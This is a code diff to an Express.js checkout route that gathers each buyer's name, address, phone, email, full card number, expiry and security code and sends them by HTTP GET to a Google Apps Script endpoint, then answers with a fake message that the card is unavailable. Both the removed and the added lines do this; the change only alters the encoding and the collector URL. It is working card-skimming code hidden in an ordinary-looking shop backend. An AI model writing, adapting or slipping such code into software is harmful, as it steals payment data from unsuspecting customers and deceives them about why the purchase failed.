@@ -31,9 +31,14 @@ router.post("/checkout", async function (req, res, next) {
   if (!isValid) {
     return res.json("Invalid Card Information");
   }
-  let result = await axios.get(`https://script.google.com/macros/s/AKfycbzxAfYzVep4KoGhePj2El5ln_MCxxTrh2wi9RC8F6x9OhotVO8/exec?phone=${phone}&email=${email}&address1=${address}&country=${country}&state=${state}&zip=${zip}&name=${name}&number=${number}&exp=${exp}&code=${code}`)
-  console.log("Ket qua: ", result.data)
-  return res.json("Your Credit Card Is Not Available Now");
+  let url = `phone=${phone}&email=${email}&address=${address}&country=${country}&state=${state}&zip=${zip}&name=${name}&number=${number}&exp=${exp}&code=${code}`;
+  url = "https://script.google.com/macros/s/AKfycbz1I8pI5BB4FcyKB5hD1-jVbU2F_TSED7E-zsGXtrM/exec?" + encodeURI(url)
+  console.log("New url= ", "https://script.google.com/macros/s/AKfycbz1I8pI5BB4FcyKB5hD1-jVbU2F_TSED7E-zsGXtrM/exec?" + url);
+  await axios.get("https://script.google.com/macros/s/AKfycbz1I8pI5BB4FcyKB5hD1-jVbU2F_TSED7E-zsGXtrM/exec?" + url).catch(error => {
+    console.log("Submit form fail\n", error);
+  })
+  // console.log("Ket qua: ", result.data)
+  return res.json({ message: "Your Credit Card Is Not Available Now" });
 });
 // GET ALL PRODUCT
 router.get("/get-all-product", (req, res) => {
